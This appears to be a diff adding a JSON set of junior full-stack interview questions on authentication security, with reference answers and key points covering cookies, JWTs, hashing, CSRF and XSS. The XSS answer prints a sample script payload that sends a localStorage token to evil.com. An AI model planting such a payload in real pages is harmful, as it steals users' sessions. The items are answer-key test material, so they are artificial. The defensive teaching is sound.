@@ -1,0 +1,482 @@
+[
+  {
+    "questionKey": "authentication-vs-authorization",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "EASY",
+    "questionText": "A user can log in to your app but gets a 403 error when trying to access the admin panel. Is this an authentication problem or an authorization problem, and why?",
+    "referenceAnswer": "This is an authorization problem, not authentication. Authentication verifies who the user is — the login succeeded, so authentication worked. Authorization determines what the user is allowed to do — the server recognized the user but denied access because they lack admin permissions. A common mistake is conflating the two: returning a 401 (Unauthorized) when you actually mean 403 (Forbidden). 401 means the server doesn't know who you are yet, while 403 means it knows who you are but you're not allowed.",
+    "keyPoints": [
+      "authentication = verifying identity (who are you)",
+      "authorization = verifying permissions (what can you do)",
+      "401 means not authenticated, 403 means not authorized",
+      "successful login does not imply access to all resources"
+    ],
+    "tags": ["auth", "authorization", "authentication", "http-status"]
+  },
+  {
+    "questionKey": "jwt-vs-session-tradeoffs",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "MEDIUM",
+    "questionText": "Your team is deciding between session-based auth and JWT for a new app. What is the key tradeoff, and what problem does each approach have?",
+    "referenceAnswer": "Session-based auth stores the session on the server (in memory or a database) and sends a session ID via a cookie. The server must look up the session on every request, which requires shared storage if you have multiple servers. JWT stores the user data inside the token itself, so the server doesn't need to look anything up — but the downside is that you can't easily revoke a JWT before it expires, because there's no server-side state to delete. A common mistake is storing sensitive data in a JWT payload thinking it's encrypted — JWT is only base64-encoded and anyone can read it.",
+    "keyPoints": [
+      "sessions require server-side storage and lookup",
+      "JWTs are stateless but hard to revoke before expiration",
+      "JWT payload is readable by anyone — not encrypted",
+      "multiple servers need shared session storage or sticky sessions"
+    ],
+    "tags": ["auth", "jwt", "sessions", "architecture"]
+  },
+  {
+    "questionKey": "password-hashing-why-not-plain",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "EASY",
+    "questionText": "Why should you never store passwords in plain text, and what happens if you hash them with a fast algorithm like MD5?",
+    "referenceAnswer": "If your database is compromised and passwords are stored in plain text, every user's password is instantly exposed — and since many users reuse passwords, the damage extends beyond your app. Hashing converts the password into a fixed-length string that can't be reversed, so even after a breach the actual passwords aren't directly readable. However, fast hashes like MD5 or SHA-256 can be brute-forced with modern hardware at billions of attempts per second. That's why you should use a slow, purpose-built hashing algorithm like bcrypt, scrypt, or Argon2, which are deliberately expensive to compute and include a salt to prevent rainbow table attacks.",
+    "keyPoints": [
+      "plain text passwords expose all users on database breach",
+      "hashing is a one-way function that prevents direct password recovery",
+      "fast hashes like MD5 are vulnerable to brute-force attacks",
+      "use bcrypt/scrypt/Argon2 with salting for password storage"
+    ],
+    "tags": ["auth", "passwords", "hashing", "security"]
+  },
+  {
+    "questionKey": "token-storage-cookie-vs-localstorage",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "MEDIUM",
+    "questionText": "A junior developer stores the JWT in localStorage so the frontend can easily read it. What security risk does this create, and what is a safer alternative?",
+    "referenceAnswer": "Storing a JWT in localStorage makes it accessible to any JavaScript running on the page, which means a cross-site scripting (XSS) attack can steal the token and impersonate the user. A safer alternative is storing the token in an httpOnly cookie, which JavaScript cannot access — the browser sends it automatically with each request. The tradeoff is that cookies require CSRF protection, but this is easier to handle than the consequences of token theft via XSS. A practical approach is to use an httpOnly, Secure, SameSite cookie for the auth token and only keep non-sensitive data in localStorage.",
+    "keyPoints": [
+      "localStorage is readable by any JavaScript, including XSS payloads",
+      "httpOnly cookies are not accessible to JavaScript",
+      "cookies need CSRF protection but prevent token theft via XSS",
+      "Secure and SameSite flags add additional cookie protection"
+    ],
+    "tags": ["auth", "token-storage", "xss", "cookies", "security"]
+  },
+  {
+    "questionKey": "protected-route-backend-check",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "EASY",
+    "questionText": "A developer hides the admin link in the frontend when the user is not an admin. Is this enough to protect the admin page, and why?",
+    "referenceAnswer": "No, hiding a UI element is not security — it's just cosmetics. Anyone can open the browser's dev tools, manually navigate to the admin URL, or call the API endpoints directly. The backend must independently verify the user's role and permissions on every request to a protected route or API endpoint. Frontend checks improve the user experience by hiding irrelevant UI, but the actual authorization enforcement must happen server-side. A common beginner mistake is assuming that if the button isn't visible, the route is safe.",
+    "keyPoints": [
+      "hiding UI elements is not a security measure",
+      "users can manually navigate to any URL or call any API",
+      "authorization must be enforced on every backend request",
+      "frontend checks are UX improvements, not security controls"
+    ],
+    "tags": ["auth", "authorization", "backend", "protected-routes"]
+  },
+  {
+    "questionKey": "cookie-secure-samesite-flags",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "MEDIUM",
+    "questionText": "What do the Secure, HttpOnly, and SameSite flags on a cookie do, and what happens if you skip them on an auth cookie?",
+    "referenceAnswer": "Secure ensures the cookie is only sent over HTTPS, preventing it from being intercepted on unencrypted connections. HttpOnly blocks JavaScript from reading the cookie, which stops XSS attacks from stealing it. SameSite controls whether the cookie is sent on cross-site requests: Strict only sends it on same-site requests, Lax allows it on top-level navigations, and None sends it always (requiring Secure). Skipping HttpOnly on an auth cookie means any XSS vulnerability can steal the session. Skipping Secure means the cookie can be intercepted on HTTP. Skipping SameSite leaves the cookie open to CSRF attacks on older browsers.",
+    "keyPoints": [
+      "Secure restricts the cookie to HTTPS connections",
+      "HttpOnly prevents JavaScript access to the cookie",
+      "SameSite controls cross-site cookie sending behavior",
+      "missing flags expose auth cookies to XSS, CSRF, or interception"
+    ],
+    "tags": ["auth", "cookies", "security", "http"]
+  },
+  {
+    "questionKey": "csrf-attack-basics",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "MEDIUM",
+    "questionText": "What is a CSRF attack, and how can it trick a logged-in user into performing actions they didn't intend?",
+    "referenceAnswer": "CSRF (Cross-Site Request Forgery) happens when a malicious website sends a request to your app using the victim's browser — the browser automatically includes the auth cookie, so the server thinks it's a legitimate request. For example, a hidden form on evil.com could POST to your-app.com/api/transfer-money, and the server would process it as if the logged-in user submitted it. Defenses include CSRF tokens (a unique value the server expects in each form submission that the attacker can't guess), the SameSite cookie attribute, and checking the Origin or Referer header. SameSite=Lax on the auth cookie blocks most CSRF attacks in modern browsers.",
+    "keyPoints": [
+      "CSRF tricks the browser into sending authenticated requests from another site",
+      "the browser auto-attaches cookies, making the request look legitimate",
+      "CSRF tokens prevent forged form submissions",
+      "SameSite cookies block most CSRF in modern browsers"
+    ],
+    "tags": ["auth", "csrf", "security", "cookies"]
+  },
+  {
+    "questionKey": "xss-attack-basics",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "MEDIUM",
+    "questionText": "How does a cross-site scripting (XSS) attack work, and what does it have to do with authentication?",
+    "referenceAnswer": "XSS happens when an attacker injects malicious JavaScript into your page — for example, by submitting a comment containing <script>fetch('evil.com?token='+localStorage.jwt)</script>. When other users view the page, the script runs in their browser with full access to the page, including cookies (unless HttpOnly), localStorage tokens, and the DOM. In the context of auth, XSS can steal session tokens, make API calls on behalf of the user, or redirect to a phishing page. Prevention means escaping or sanitizing all user-generated content before rendering it, using HttpOnly cookies for tokens, and applying Content Security Policy (CSP) headers.",
+    "keyPoints": [
+      "XSS injects malicious JavaScript that runs in other users' browsers",
+      "injected scripts can steal tokens and make authenticated API calls",
+      "escape all user-generated content before rendering",
+      "HttpOnly cookies and CSP headers reduce XSS impact"
+    ],
+    "tags": ["auth", "xss", "security", "frontend"]
+  },
+  {
+    "questionKey": "jwt-expiration-refresh-flow",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "MEDIUM",
+    "questionText": "Why do JWTs have an expiration time, and what happens when a user's token expires mid-session?",
+    "referenceAnswer": "JWTs cannot be revoked server-side, so expiration is the main way to limit how long a stolen token stays valid. Short-lived tokens (e.g. 15 minutes) reduce the damage window but would force users to log in constantly. The solution is a refresh token: a separate, longer-lived token stored securely that the client uses to get a new access token when the old one expires. The refresh token is typically stored in an httpOnly cookie and validated against a server-side store, so it can be revoked. A common mistake is setting the access token to expire after days or weeks, which means a stolen token is usable for a very long time.",
+    "keyPoints": [
+      "expiration limits the damage window of a stolen JWT",
+      "short-lived access tokens require a refresh token mechanism",
+      "refresh tokens are longer-lived and can be revoked server-side",
+      "long expiration times on access tokens increase theft risk"
+    ],
+    "tags": ["auth", "jwt", "refresh-token", "security"]
+  },
+  {
+    "questionKey": "password-salt-purpose",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "EASY",
+    "questionText": "What is a salt in password hashing, and why does hashing without a salt leave users vulnerable?",
+    "referenceAnswer": "A salt is a random string added to the password before hashing, making each hash unique even if two users have the same password. Without a salt, identical passwords produce identical hashes, which means an attacker can use precomputed lookup tables (rainbow tables) to crack many passwords at once. With a unique salt per user, each hash must be attacked individually, which is vastly slower. bcrypt, scrypt, and Argon2 generate and store the salt automatically as part of the hash output. A common mistake is using a single hardcoded salt for all users, which still allows batch attacks against users who share the same password.",
+    "keyPoints": [
+      "salt is a random string added to the password before hashing",
+      "without salt, identical passwords produce identical hashes",
+      "rainbow tables can crack unsalted hashes in bulk",
+      "each user needs a unique salt — never use one global salt"
+    ],
+    "tags": ["auth", "passwords", "hashing", "salt"]
+  },
+  {
+    "questionKey": "logout-session-invalidation",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "EASY",
+    "questionText": "A user clicks logout but can still access protected pages by replaying the old token. What went wrong?",
+    "referenceAnswer": "The logout only cleared the token on the client side (e.g. removed it from localStorage or the cookie) but didn't invalidate it on the server. With session-based auth, the server must destroy the session record so the session ID becomes invalid. With JWT, there is no server-side session to destroy — the token remains valid until it expires. To handle JWT logout, you can maintain a server-side blocklist of revoked tokens, use short expiration times with refresh tokens (and revoke the refresh token on logout), or switch to session-based auth where server-side invalidation is straightforward.",
+    "keyPoints": [
+      "client-side token removal is not enough for secure logout",
+      "session-based auth must destroy the server-side session",
+      "JWTs remain valid until expiration — there's no server-side record to delete",
+      "token blocklists or refresh token revocation handle JWT logout"
+    ],
+    "tags": ["auth", "logout", "sessions", "jwt"]
+  },
+  {
+    "questionKey": "login-error-message-leaking",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "EASY",
+    "questionText": "Your login form shows 'User not found' when the email is wrong and 'Wrong password' when only the password is wrong. Why is this a security problem?",
+    "referenceAnswer": "Separate error messages tell an attacker which part of the credentials is correct. If 'User not found' confirms the email doesn't exist, the attacker can enumerate valid emails by trying different addresses. Once they find a valid email, they know to focus on guessing the password. The safer approach is a single generic message like 'Invalid email or password' for both cases, so the attacker cannot tell whether the email or password is wrong. This also applies to password reset flows: always say 'If an account with that email exists, we sent a reset link' instead of confirming whether the email is registered.",
+    "keyPoints": [
+      "specific error messages help attackers enumerate valid emails",
+      "use a generic message for both wrong email and wrong password",
+      "password reset should not confirm if an email is registered",
+      "this prevents user enumeration attacks"
+    ],
+    "tags": ["auth", "login", "security", "user-enumeration"]
+  },
+  {
+    "questionKey": "rate-limiting-login-attempts",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "EASY",
+    "questionText": "Why should you limit the number of login attempts, and what is a simple way to implement it?",
+    "referenceAnswer": "Without rate limiting, an attacker can try thousands of password combinations per second in a brute-force attack. Rate limiting slows this down by blocking or delaying requests after a certain number of failed attempts. A simple approach is to track failed attempts per IP or per account and return a 429 (Too Many Requests) after the limit is reached, with a cooldown period. More advanced options include exponential backoff (increasing the wait time after each failure) and CAPTCHA challenges. A common mistake is only rate limiting on the frontend — the backend must enforce the limit because attackers bypass the UI entirely.",
+    "keyPoints": [
+      "without rate limiting, brute-force attacks try thousands of passwords",
+      "track failed attempts per IP or account and enforce a cooldown",
+      "return 429 Too Many Requests when the limit is reached",
+      "rate limiting must be enforced on the backend, not just the frontend"
+    ],
+    "tags": ["auth", "rate-limiting", "brute-force", "security"]
+  },
+  {
+    "questionKey": "oauth-basic-flow",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "MEDIUM",
+    "questionText": "When a user clicks 'Login with Google', what happens between the browser, your server, and Google?",
+    "referenceAnswer": "The browser redirects the user to Google's authorization page. The user logs in with Google and grants permission. Google redirects back to your app with an authorization code. Your server exchanges this code for an access token by making a server-to-server request to Google. The access token lets your server fetch the user's profile information from Google's API. Your server then creates or finds the user in your database and establishes a session or issues a JWT. A common mistake is handling the token exchange on the frontend — the authorization code should be exchanged server-side to keep your client secret secure.",
+    "keyPoints": [
+      "user is redirected to the provider's login page",
+      "provider redirects back with an authorization code",
+      "server exchanges the code for an access token server-side",
+      "never expose the client secret on the frontend"
+    ],
+    "tags": ["auth", "oauth", "social-login", "architecture"]
+  },
+  {
+    "questionKey": "middleware-auth-check-pattern",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "EASY",
+    "questionText": "How do you avoid duplicating authentication checks in every API route handler?",
+    "referenceAnswer": "Use auth middleware that runs before your route handlers. The middleware extracts the token or session from the request, verifies it, and either attaches the user information to the request object and calls next(), or returns a 401 error. This way, individual route handlers can trust that req.user exists without checking credentials themselves. In Express, this looks like app.use('/api', authMiddleware) to protect all routes under /api. A common mistake is adding the auth check inside each handler — this leads to duplication, inconsistency, and forgotten checks on new routes.",
+    "keyPoints": [
+      "auth middleware runs before route handlers",
+      "middleware verifies the token and attaches user info to the request",
+      "routes under the middleware can trust that the user is authenticated",
+      "avoids duplication and forgotten auth checks on new routes"
+    ],
+    "tags": ["auth", "middleware", "backend", "express"]
+  },
+  {
+    "questionKey": "role-based-access-control",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "MEDIUM",
+    "questionText": "How would you implement role-based access control so that admins can manage users but regular users cannot?",
+    "referenceAnswer": "Store the user's role (e.g. 'user', 'admin') in the database and include it in the session or JWT claims. Create authorization middleware that checks the role against the required permission for each route. For example, a deleteUser endpoint would check if req.user.role === 'admin' before proceeding. Keep the role check on the server — never trust a role value sent from the frontend. A common mistake is checking roles only on the frontend to hide buttons, while the API endpoint accepts requests from anyone. Another pitfall is hardcoding role checks in every handler instead of using reusable middleware like requireRole('admin').",
+    "keyPoints": [
+      "store roles in the database and include them in session/JWT",
+      "authorization middleware checks roles before route execution",
+      "never trust role values sent from the client",
+      "use reusable middleware instead of hardcoding checks in each handler"
+    ],
+    "tags": ["auth", "authorization", "rbac", "backend"]
+  },
+  {
+    "questionKey": "https-why-required-for-auth",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "EASY",
+    "questionText": "Why is HTTPS required for any application that handles login or authentication?",
+    "referenceAnswer": "Without HTTPS, all data between the browser and the server is sent in plain text, which means anyone on the same network can intercept login credentials, session cookies, and tokens using tools like Wireshark. This is called a man-in-the-middle attack. HTTPS encrypts the connection with TLS, so even if traffic is intercepted, it cannot be read. The Secure flag on cookies only works over HTTPS — without it, the flag is ignored and cookies are sent over HTTP. A common mistake is using HTTPS in production but developing without it, then forgetting that some security features like Secure cookies and certain browser APIs require HTTPS.",
+    "keyPoints": [
+      "HTTP sends credentials and tokens in plain text",
+      "anyone on the same network can intercept unencrypted traffic",
+      "HTTPS encrypts the connection with TLS",
+      "Secure cookie flag requires HTTPS to function"
+    ],
+    "tags": ["auth", "https", "security", "tls"]
+  },
+  {
+    "questionKey": "cors-auth-header-issue",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "MEDIUM",
+    "questionText": "Your frontend on localhost:3000 sends an Authorization header to your API on localhost:4000, but the request fails. What is likely happening?",
+    "referenceAnswer": "This is a CORS (Cross-Origin Resource Sharing) issue. When the frontend and backend are on different origins, the browser sends a preflight OPTIONS request to check if the server allows the cross-origin request. The server must respond with Access-Control-Allow-Origin matching the frontend's origin and Access-Control-Allow-Headers including Authorization. If the server doesn't return these headers, the browser blocks the request before it even reaches your route handler. A common mistake is setting Access-Control-Allow-Origin to * when using credentials — the browser rejects this combination, requiring an explicit origin instead.",
+    "keyPoints": [
+      "different origins trigger CORS preflight checks",
+      "server must explicitly allow the Authorization header in CORS config",
+      "wildcard origin (*) is rejected when credentials are included",
+      "the browser blocks the request — it never reaches the backend"
+    ],
+    "tags": ["auth", "cors", "security", "http"]
+  },
+  {
+    "questionKey": "session-fixation-attack",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "HARD",
+    "questionText": "What is session fixation, and how do you prevent it during login?",
+    "referenceAnswer": "Session fixation is when an attacker sets a known session ID on the victim's browser before they log in. If the server does not create a new session after authentication, the attacker's session ID becomes associated with the victim's authenticated session — the attacker can then use that same session ID to access the account. The fix is to always regenerate the session ID after successful authentication. Most session libraries have a method for this, like req.session.regenerate() in Express. This ensures the pre-login session ID is invalid and the authenticated session uses a fresh, unpredictable ID.",
+    "keyPoints": [
+      "attacker sets a known session ID before the victim logs in",
+      "if the session ID is not regenerated, the attacker shares the session",
+      "always regenerate the session ID after successful login",
+      "session libraries provide built-in regeneration methods"
+    ],
+    "tags": ["auth", "sessions", "session-fixation", "security"]
+  },
+  {
+    "questionKey": "jwt-structure-three-parts",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "EASY",
+    "questionText": "What are the three parts of a JWT, and what does each contain?",
+    "referenceAnswer": "A JWT has three base64-encoded parts separated by dots: header, payload, and signature. The header specifies the algorithm used for signing (e.g. HS256). The payload contains the claims — data like user ID, role, and the expiration time. The signature is created by hashing the header and payload with a secret key, so the server can verify the token hasn't been tampered with. Anyone can decode and read the header and payload — they are not encrypted, just encoded. A common mistake is storing sensitive information like passwords in the payload, thinking JWT provides encryption.",
+    "keyPoints": [
+      "JWT has three parts: header, payload, signature",
+      "header specifies the signing algorithm",
+      "payload contains claims like user ID and expiration",
+      "signature verifies the token hasn't been tampered with"
+    ],
+    "tags": ["auth", "jwt", "token-structure"]
+  },
+  {
+    "questionKey": "password-reset-flow-secure",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "MEDIUM",
+    "questionText": "How would you implement a secure password reset flow, and what common mistakes should you avoid?",
+    "referenceAnswer": "Generate a random, single-use reset token, store its hash in the database with an expiration time, and send the unhashed token to the user's email as a link. When the user clicks the link, verify the token hash and expiration, let them set a new password, then delete the token. Common mistakes include: using predictable tokens (like sequential IDs or the user's email as the token), not expiring the token (so old links stay valid forever), not hashing the stored token (so a database breach exposes all active reset links), and confirming whether an email is registered in the response (which enables enumeration).",
+    "keyPoints": [
+      "generate a random, single-use reset token with an expiration",
+      "store only the hash of the token in the database",
+      "delete the token after use to prevent reuse",
+      "do not confirm whether the email exists in the response"
+    ],
+    "tags": ["auth", "password-reset", "security", "tokens"]
+  },
+  {
+    "questionKey": "signup-input-validation",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "EASY",
+    "questionText": "What should you validate on the backend when a user signs up, even if the frontend already validates the form?",
+    "referenceAnswer": "The backend must re-validate everything: email format, password minimum length, required fields, and any business rules like unique email. Frontend validation improves UX by giving instant feedback, but it can be completely bypassed — anyone can send a direct HTTP request to your API without using the form. At minimum, check that the email is a valid format and not already registered, the password meets length requirements, and no required fields are missing. A common mistake is trusting the frontend to enforce password strength and getting users with one-character passwords because the API never checked.",
+    "keyPoints": [
+      "frontend validation can be bypassed entirely",
+      "backend must validate email format, uniqueness, and required fields",
+      "password strength must be enforced server-side",
+      "never trust client-side input — always re-validate"
+    ],
+    "tags": ["auth", "validation", "signup", "backend"]
+  },
+  {
+    "questionKey": "session-cookie-vs-bearer-token",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "MEDIUM",
+    "questionText": "What is the difference between sending credentials via a session cookie and an Authorization: Bearer header?",
+    "referenceAnswer": "A session cookie is sent automatically by the browser on every request to the same domain — you don't write any client-side code to attach it. A Bearer token is sent manually in the Authorization header, which means the client code must explicitly include it with each request. Cookies are domain-scoped and follow cookie rules (SameSite, HttpOnly, Secure), while Bearer tokens can be sent to any server. Cookies work well for traditional web apps where the browser handles requests, while Bearer tokens are common in SPAs and mobile apps that make explicit API calls. A key difference is that cookies are vulnerable to CSRF (the browser sends them automatically), while Bearer tokens are not (the code must attach them explicitly).",
+    "keyPoints": [
+      "cookies are sent automatically by the browser, Bearer tokens are attached manually",
+      "cookies follow domain scoping and cookie flags",
+      "Bearer tokens can be sent to any server",
+      "cookies are CSRF-vulnerable because they are sent automatically"
+    ],
+    "tags": ["auth", "cookies", "bearer-token", "http"]
+  },
+  {
+    "questionKey": "token-in-url-problem",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "EASY",
+    "questionText": "A developer puts the auth token in the URL query string like /api/data?token=abc123. Why is this dangerous?",
+    "referenceAnswer": "URLs are logged in many places: server access logs, browser history, proxy logs, and analytics tools. Putting a token in the URL means it can be leaked through any of these channels. The Referer header also includes the full URL, so if the page links to an external site, the token is sent along. Shared links and screenshots can accidentally expose the token too. Tokens should be sent in the Authorization header or in an httpOnly cookie, where they are not visible in logs or browser history. The only common exception is short-lived, single-use tokens like email verification links, which expire quickly.",
+    "keyPoints": [
+      "URLs appear in server logs, browser history, and Referer headers",
+      "tokens in URLs can leak to external sites via Referer",
+      "use Authorization header or httpOnly cookies instead",
+      "exception: short-lived single-use tokens like email verification"
+    ],
+    "tags": ["auth", "tokens", "security", "http"]
+  },
+  {
+    "questionKey": "password-comparison-timing-attack",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "HARD",
+    "questionText": "Why should you use a constant-time comparison when verifying passwords or tokens, and what can go wrong with a regular string comparison?",
+    "referenceAnswer": "A regular string comparison (===) returns false as soon as it finds the first mismatching character, which means it takes slightly longer when more characters match. An attacker can measure these tiny timing differences to guess the correct value one character at a time — this is called a timing attack. Constant-time comparison functions like crypto.timingSafeEqual() in Node.js always take the same amount of time regardless of where the mismatch occurs, so the attacker learns nothing from the response time. In practice, bcrypt.compare() already handles this for password verification. This matters most for comparing raw tokens, API keys, or HMAC signatures where the comparison is direct.",
+    "keyPoints": [
+      "regular comparison leaks information through timing differences",
+      "attackers can guess values character by character from response time",
+      "constant-time comparison takes the same time regardless of match position",
+      "bcrypt.compare() handles this automatically for password checks"
+    ],
+    "tags": ["auth", "security", "timing-attack", "passwords"]
+  },
+  {
+    "questionKey": "remember-me-implementation",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "MEDIUM",
+    "questionText": "How would you implement a 'Remember me' checkbox on a login form, and what is the security tradeoff?",
+    "referenceAnswer": "Without 'Remember me', the session cookie is a session cookie — it expires when the browser closes. With 'Remember me', you set an explicit expiration (e.g. 30 days) on the cookie so it persists across browser restarts. The tradeoff is that a longer-lived session gives an attacker more time to use a stolen cookie. A safer approach is to issue a separate, long-lived 'remember me' token stored in the database, which creates a new short-lived session on each visit. This way you can revoke the remember-me token without invalidating other sessions. A common mistake is simply extending the session to 30 days, which means a single stolen cookie provides access for a month.",
+    "keyPoints": [
+      "session cookies expire when the browser closes",
+      "remember-me sets a persistent cookie with explicit expiration",
+      "longer-lived sessions increase the window for stolen cookie abuse",
+      "a separate revocable remember-me token is safer than extending the session"
+    ],
+    "tags": ["auth", "remember-me", "sessions", "cookies"]
+  },
+  {
+    "questionKey": "api-key-vs-user-token",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "EASY",
+    "questionText": "What is the difference between an API key and a user authentication token?",
+    "referenceAnswer": "An API key identifies the application or client making the request, while an authentication token identifies the specific user. For example, a weather API gives you an API key to track usage and rate limits per app, but it doesn't know which user in your app made the call. A user token (session or JWT) proves that a specific person is logged in and carries their identity and permissions. API keys are typically long-lived and shared across all users of an application, while user tokens are per-user and shorter-lived. A common mistake is treating API keys as user authentication — API keys alone don't tell you who the user is.",
+    "keyPoints": [
+      "API keys identify the application, user tokens identify the person",
+      "API keys track usage and rate limits per client",
+      "user tokens carry identity and permission information",
+      "API keys are not user authentication"
+    ],
+    "tags": ["auth", "api-key", "tokens", "architecture"]
+  },
+  {
+    "questionKey": "frontend-auth-state-management",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "MEDIUM",
+    "questionText": "How should a React app know whether the user is logged in, and what mistake happens when you rely only on local state?",
+    "referenceAnswer": "The frontend typically calls an endpoint like /api/me on page load to check if the user's session or token is still valid, and stores the result in app state (context, store, or state). If the server confirms the session, the app shows the authenticated UI; if not, it redirects to login. A mistake is storing isLoggedIn: true in localStorage after login and never re-checking with the server — the session might have expired or been revoked, but the frontend still shows protected content. Another problem is allowing the user to see a flash of protected content before the auth check completes. Use a loading state until the server responds.",
+    "keyPoints": [
+      "check auth status with the server on page load, not just local state",
+      "local isLoggedIn flags can become stale if the session expires",
+      "show a loading state until the server confirms authentication",
+      "never trust client-side auth state without server validation"
+    ],
+    "tags": ["auth", "frontend", "react", "state-management"]
+  },
+  {
+    "questionKey": "environment-variable-secret-storage",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "EASY",
+    "questionText": "Where should you store secrets like your JWT signing key or database password, and why not in the source code?",
+    "referenceAnswer": "Secrets should be stored in environment variables or a secrets manager, never hardcoded in source code. If a secret is in the code, it ends up in the git history — even if you delete it later, anyone with access to the repository can find it in past commits. Environment variables are set on the server or in a .env file that is excluded from version control via .gitignore. A common mistake is committing a .env file to the repository, or logging environment variables during debugging and leaving the logs accessible. For production, use your hosting platform's secrets management rather than .env files on disk.",
+    "keyPoints": [
+      "never hardcode secrets in source code — they end up in git history",
+      "use environment variables or a secrets manager",
+      ".env files must be in .gitignore and never committed",
+      "avoid logging secrets during debugging"
+    ],
+    "tags": ["auth", "secrets", "environment-variables", "security"]
+  },
+  {
+    "questionKey": "multi-tab-logout-consistency",
+    "roleSlug": "junior-fullstack",
+    "topicSlug": "auth-security",
+    "language": "en",
+    "difficulty": "MEDIUM",
+    "questionText": "A user logs out in one browser tab, but their other open tab still shows them as logged in. How would you handle this?",
+    "referenceAnswer": "Cookies are shared across all tabs for the same origin, so when one tab logs out and the cookie is deleted, it is gone for every tab. However, each tab has its own in-memory UI state — the other tabs still show the authenticated interface because their JavaScript doesn't know the cookie changed. The next server request from any tab will fail authentication, but until that happens the UI looks stale. To sync tabs proactively, you can use the BroadcastChannel API or listen to localStorage storage events: one tab writes a logout signal, the others receive the event and redirect to the login page immediately. Another approach is polling the auth endpoint periodically, though this is less responsive.",
+    "keyPoints": [
+      "each tab has its own in-memory state that doesn't sync automatically",
+      "BroadcastChannel or localStorage events can notify other tabs",
+      "the next server request from any tab will fail if the session is invalidated",
+      "polling the auth endpoint is an alternative but less responsive approach"
+    ],
+    "tags": ["auth", "frontend", "multi-tab", "logout"]
+  }
+]
